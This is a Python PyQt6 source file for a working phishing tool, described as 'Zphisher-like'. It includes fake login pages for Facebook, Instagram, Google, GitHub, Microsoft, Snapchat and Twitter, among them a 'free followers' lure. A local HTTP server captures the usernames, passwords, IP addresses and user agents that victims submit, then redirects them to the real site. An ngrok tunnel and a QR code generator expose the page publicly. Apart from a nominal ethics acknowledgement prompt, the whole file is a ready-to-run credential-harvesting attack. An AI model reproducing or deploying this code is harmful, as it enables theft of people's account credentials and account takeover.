#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Zphisher-like Phishing Module - Works with ngrok and localhost.
"""

import os
import json
import logging
import queue
import time
import tempfile
import subprocess
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

from PyQt6.QtCore import QThread, pyqtSignal, QUrl, Qt
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel,
    QListWidget, QListWidgetItem, QGroupBox, QTableWidget, QTableWidgetItem,
    QHeaderView, QSpinBox, QLineEdit, QFileDialog, QMessageBox, QApplication, QTabWidget,
    QInputDialog
)
from PyQt6.QtGui import QDesktopServices, QPixmap

from core.config_manager import ConfigManager
from modules.phishing.ethics_guard import EthicsGuard

logger = logging.getLogger(__name__)

# ---------- Templates ----------
TEMPLATES = {
    "Facebook": {
        "Traditional Login Page": """<!DOCTYPE html>
<html><head><title>Facebook Login</title></head>
<body style="background:#f0f2f5;"><div style="width:350px;margin:100px auto;background:white;padding:20px;">
<h2>Facebook</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or Phone" style="width:100%;padding:10px;margin:5px 0;">
<input type="password" name="pass" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;">
<button type="submit">Log In</button>
</form></div></body></html>"""
    },
    "Instagram": {
        "Traditional Login Page": """<!DOCTYPE html>
<html><head><title>Instagram Login</title></head>
<body><div style="width:300px;margin:100px auto;">
<h2>Instagram</h2>
<form method="POST" action="/capture">
<input name="username" placeholder="Username"><br>
<input name="password" type="password" placeholder="Password"><br>
<button type="submit">Log In</button>
</form></div></body></html>""",
        "Auto Followers Login Page": """<!DOCTYPE html>
<html><head><title>Get Free Followers</title></head>
<body><div style="width:300px;margin:100px auto;">
<h2>Get 1000 Followers</h2>
<form method="POST" action="/capture">
<input name="username" placeholder="Instagram Username"><br>
<input name="password" type="password" placeholder="Password"><br>
<button type="submit">Get Followers</button>
</form></div></body></html>"""
    },
    "Google": {
        "Traditional Login Page": """<!DOCTYPE html>
<html><head><title>Google Sign In</title></head>
<body><div style="width:300px;margin:100px auto;">
<h2>Google</h2>
<form method="POST" action="/capture">
<input name="email" placeholder="Email"><br>
<input name="password" type="password" placeholder="Password"><br>
<button type="submit">Sign in</button>
</form></div></body></html>"""
    },
    "GitHub": {
        "Traditional Login Page": """<!DOCTYPE html>
<html><head><title>GitHub Login</title></head>
<body><div style="width:300px;margin:100px auto;">
<h2>GitHub</h2>
<form method="POST" action="/capture">
<input name="login" placeholder="Username or email"><br>
<input name="password" type="password" placeholder="Password"><br>
<button type="submit">Sign in</button>
</form></div></body></html>"""
    },
    "Microsoft": {
        "Traditional Login Page": """<!DOCTYPE html>
<html><head><title>Microsoft Sign In</title></head>
<body><div style="width:300px;margin:100px auto;">
<h2>Microsoft</h2>
<form method="POST" action="/capture">
<input name="loginfmt" placeholder="Email, phone, or Skype"><br>
<input name="passwd" type="password" placeholder="Password"><br>
<button type="submit">Sign in</button>
</form></div></body></html>"""
    },
    "Snapchat": {
        "Traditional Login Page": """<!DOCTYPE html>
<html><head><title>Snapchat Login</title></head>
<body><div style="width:300px;margin:100px auto;">
<h2>Snapchat</h2>
<form method="POST" action="/capture">
<input name="username" placeholder="Username or Email"><br>
<input name="password" type="password" placeholder="Password"><br>
<button type="submit">Log In</button>
</form></div></body></html>"""
    },
    "Twitter": {
        "Traditional Login Page": """<!DOCTYPE html>
<html><head><title>Twitter Login</title></head>
<body><div style="width:300px;margin:100px auto;">
<h2>Twitter</h2>
<form method="POST" action="/capture">
<input name="session[username_or_email]" placeholder="Phone, email, or username"><br>
<input name="session[password]" type="password" placeholder="Password"><br>
<button type="submit">Log In</button>
</form></div></body></html>"""
    }
}

# ---------- HTTP Server ----------
class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server.template_html.encode())
        else:
            self.send_response(404)
            self.end_headers()
    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode()
            creds = {}
            for item in data.split('&'):
                if '=' in item:
                    k, v = item.split('=', 1)
                    creds[k] = v
            self.server.cred_queue.put({
                'ts': datetime.now().isoformat(),
                'ip': self.client_address[0],
                'ua': self.headers.get('User-Agent', ''),
                'data': creds
            })
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            if self.server.redirect_url:
                self.wfile.write(f'<html><meta http-equiv="refresh" content="0;url={self.server.redirect_url}"></html>'.encode())
            else:
                self.wfile.write(b'<html><body>Thank you</body></html>')

class ServerThread(QThread):
    started = pyqtSignal(int)
    credential = pyqtSignal(dict)
    stopped = pyqtSignal()
    error = pyqtSignal(str)
    def __init__(self, port, template_html, redirect_url):
        super().__init__()
        self.port = port
        self.template_html = template_html
        self.redirect_url = redirect_url
        self.server = None
        self.running = False
        self.queue = queue.Queue()
    def run(self):
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), PhishHandler)
            self.server.template_html = self.template_html
            self.server.redirect_url = self.redirect_url
            self.server.cred_queue = self.queue
            self.running = True
            self.started.emit(self.port)
            while self.running:
                self.server.handle_request()
                while not self.queue.empty():
                    self.credential.emit(self.queue.get_nowait())
                self.msleep(50)
        except Exception as e:
            self.error.emit(str(e))
        finally:
            self.stopped.emit()
    def stop(self):
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()

class NgrokWorker(QThread):
    ready = pyqtSignal(str)
    error = pyqtSignal(str)
    def __init__(self, port, token):
        super().__init__()
        self.port = port
        self.token = token
    def run(self):
        try:
            import pyngrok.ngrok as ngrok
            ngrok.set_auth_token(self.token)
            tunnel = ngrok.connect(self.port, proto='http')
            self.ready.emit(tunnel.public_url)
        except Exception as e:
            self.error.emit(str(e))

# ---------- Main Widget ----------
class ZphisherLikeWidget(QWidget):
    status_update = pyqtSignal(str)
    def __init__(self, parent=None):
        super().__init__(parent)
        self.server = None
        self.ngrok_worker = None
        self.ethics = EthicsGuard()
        self.setup_ui()
        self.connect_signals()
        self.selected_service = None
        self.selected_page = None
        self.method = "local"

    def setup_ui(self):
        layout = QVBoxLayout(self)
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)

        # Tab 1: Setup
        setup = QWidget()
        setup_layout = QVBoxLayout(setup)
        g1 = QGroupBox("1. Choose Service")
        g1_layout = QHBoxLayout(g1)
        self.service_list = QListWidget()
        self.service_list.setMaximumHeight(120)
        for s in ["Facebook","Instagram","Google","GitHub","Microsoft","Snapchat","Twitter"]:
            self.service_list.addItem(s)
        g1_layout.addWidget(self.service_list)
        setup_layout.addWidget(g1)

        g2 = QGroupBox("2. Choose Page Type")
        g2_layout = QHBoxLayout(g2)
        self.page_list = QListWidget()
        self.page_list.setMaximumHeight(100)
        g2_layout.addWidget(self.page_list)
        setup_layout.addWidget(g2)

        g3 = QGroupBox("3. Port Forwarding Method")
        g3_layout = QHBoxLayout(g3)
        self.btn_local = QPushButton("Localhost (local only)")
        self.btn_ngrok = QPushButton("ngrok (public)")
        g3_layout.addWidget(self.btn_local)
        g3_layout.addWidget(self.btn_ngrok)
        setup_layout.addWidget(g3)

        port_layout = QHBoxLayout()
        port_layout.addWidget(QLabel("Port:"))
        self.port_spin = QSpinBox()
        self.port_spin.setRange(1024,65535)
        self.port_spin.setValue(8080)
        port_layout.addWidget(self.port_spin)
        setup_layout.addLayout(port_layout)

        redirect_layout = QHBoxLayout()
        redirect_layout.addWidget(QLabel("Redirect URL (real site):"))
        self.redirect_url = QLineEdit()
        redirect_layout.addWidget(self.redirect_url)
        setup_layout.addLayout(redirect_layout)

        self.start_btn = QPushButton("▶ Start Phishing")
        setup_layout.addWidget(self.start_btn)
        self.tabs.addTab(setup, "Setup")

        # Tab 2: Capture
        capture = QWidget()
        cap_layout = QVBoxLayout(capture)
        self.status_label = QLabel("Server: Stopped")
        self.url_label = QLabel("Public URL: --")
        cap_layout.addWidget(self.status_label)
        cap_layout.addWidget(self.url_label)
        self.creds_table = QTableWidget()
        self.creds_table.setColumnCount(5)
        self.creds_table.setHorizontalHeaderLabels(["Time","IP","Username","Password","User-Agent"])
        self.creds_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        cap_layout.addWidget(self.creds_table)
        self.stop_btn = QPushButton("■ Stop Server")
        self.stop_btn.setEnabled(False)
        cap_layout.addWidget(self.stop_btn)
        self.tabs.addTab(capture, "Capture")

        # Tab 3: URL & QR
        url_tab = QWidget()
        url_layout = QVBoxLayout(url_tab)
        self.public_url_edit = QLineEdit()
        self.public_url_edit.setReadOnly(True)
        url_layout.addWidget(QLabel("Public URL:"))
        url_layout.addWidget(self.public_url_edit)
        copy_btn = QPushButton("Copy URL")
        open_btn = QPushButton("Open in Browser")
        url_layout.addWidget(copy_btn)
        url_layout.addWidget(open_btn)
        self.qr_label = QLabel()
        self.qr_label.setFixedSize(200,200)
        self.qr_label.setStyleSheet("border:1px solid #30363D; background:white;")
        url_layout.addWidget(self.qr_label)
        save_qr = QPushButton("Save QR Code")
        url_layout.addWidget(save_qr)
        self.tabs.addTab(url_tab, "Exposure")
        copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(self.public_url_edit.text()))
        open_btn.clicked.connect(lambda: QDesktopServices.openUrl(QUrl(self.public_url_edit.text())))
        save_qr.clicked.connect(self.save_qr)

    def connect_signals(self):
        self.service_list.itemClicked.connect(self.on_service_selected)
        self.page_list.itemClicked.connect(lambda i: setattr(self, 'selected_page', i.text()))
        self.btn_local.clicked.connect(lambda: setattr(self, 'method', 'local'))
        self.btn_ngrok.clicked.connect(lambda: setattr(self, 'method', 'ngrok'))
        self.start_btn.clicked.connect(self.start_phishing)
        self.stop_btn.clicked.connect(self.stop_server)

    def on_service_selected(self, item):
        self.selected_service = item.text()
        self.page_list.clear()
        if self.selected_service in TEMPLATES:
            for pt in TEMPLATES[self.selected_service].keys():
                self.page_list.addItem(pt)
        else:
            self.page_list.addItem("Traditional Login Page")
        # Try to auto-fill redirect URL
        if self.selected_service == "Facebook":
            self.redirect_url.setText("https://www.facebook.com")
        elif self.selected_service == "Instagram":
            self.redirect_url.setText("https://www.instagram.com")
        elif self.selected_service == "Google":
            self.redirect_url.setText("https://www.google.com")
        elif self.selected_service == "GitHub":
            self.redirect_url.setText("https://github.com")
        elif self.selected_service == "Microsoft":
            self.redirect_url.setText("https://www.microsoft.com")
        elif self.selected_service == "Snapchat":
            self.redirect_url.setText("https://www.snapchat.com")
        elif self.selected_service == "Twitter":
            self.redirect_url.setText("https://twitter.com")

    def start_phishing(self):
        if not self.ethics.check_acknowledged(self):
            return
        if not self.selected_service or not self.selected_page:
            QMessageBox.warning(self,"Incomplete","Select service and page type.")
            return
        port = self.port_spin.value()
        template = TEMPLATES[self.selected_service][self.selected_page]
        redirect = self.redirect_url.text().strip()
        # Start server
        self.server = ServerThread(port, template, redirect)
        self.server.started.connect(self.on_server_started)
        self.server.credential.connect(self.on_credential)
        self.server.stopped.connect(self.on_server_stopped)
        self.server.error.connect(lambda e: QMessageBox.critical(self,"Server Error",e))
        self.server.start()
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_label.setText("Server: Starting...")
        if self.method == "ngrok":
            token = ConfigManager().get_secret('ngrok_token')
            if not token:
                token, ok = QInputDialog.getText(self, "ngrok Token", "Enter your ngrok auth token:")
                if ok and token:
                    ConfigManager().set_secret('ngrok_token', token)
                else:
                    self.stop_server()
                    return
            self.ngrok_worker = NgrokWorker(port, token)
            self.ngrok_worker.ready.connect(self.on_tunnel_ready)
            self.ngrok_worker.error.connect(lambda e: QMessageBox.critical(self,"ngrok Error",e))
            self.ngrok_worker.start()
        else:
            self.on_tunnel_ready(f"http://localhost:{port}")

    def on_server_started(self, port):
        self.status_label.setText(f"Server: Running on port {port}")

    def on_tunnel_ready(self, url):
        self.public_url_edit.setText(url)
        self.url_label.setText(f"Public URL: {url}")
        self.status_update.emit(f"Phishing URL: {url}")
        try:
            import qrcode
            img = qrcode.make(url)
            tmp = Path(tempfile.gettempdir()) / "aimas_qr.png"
            img.save(tmp)
            pix = QPixmap(str(tmp))
            self.qr_label.setPixmap(pix.scaled(200,200))
        except:
            pass

    def on_credential(self, cred):
        row = self.creds_table.rowCount()
        self.creds_table.insertRow(row)
        self.creds_table.setItem(row,0, QTableWidgetItem(cred['ts'][:19]))
        self.creds_table.setItem(row,1, QTableWidgetItem(cred['ip']))
        data = cred['data']
        uname = data.get('username') or data.get('email') or data.get('login') or data.get('loginfmt') or ''
        pwd = data.get('password') or data.get('pass') or data.get('passwd') or ''
        self.creds_table.setItem(row,2, QTableWidgetItem(uname))
        self.creds_table.setItem(row,3, QTableWidgetItem(pwd))
        self.creds_table.setItem(row,4, QTableWidgetItem(cred['ua'][:50]))
        self.status_update.emit(f"New credential from {cred['ip']}")

    def stop_server(self):
        if self.server:
            self.server.stop()
            self.server.wait()
            self.server = None
        if self.ngrok_worker:
            self.ngrok_worker.terminate()
            self.ngrok_worker = None
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("Server: Stopped")
        self.url_label.setText("Public URL: --")
        self.public_url_edit.clear()
        self.status_update.emit("Server stopped.")

    def on_server_stopped(self):
        self.stop_server()

    def save_qr(self):
        if not self.qr_label.pixmap():
            QMessageBox.warning(self,"No QR","Generate a QR code first.")
            return
        path,_ = QFileDialog.getSaveFileName(self,"Save QR","qr.png","PNG (*.png)")
        if path:
            self.qr_label.pixmap().save(path)
            self.status_update.emit(f"QR saved to {path}")

    def get_module_name(self):
        return "Phishing (Zphisher-like)"
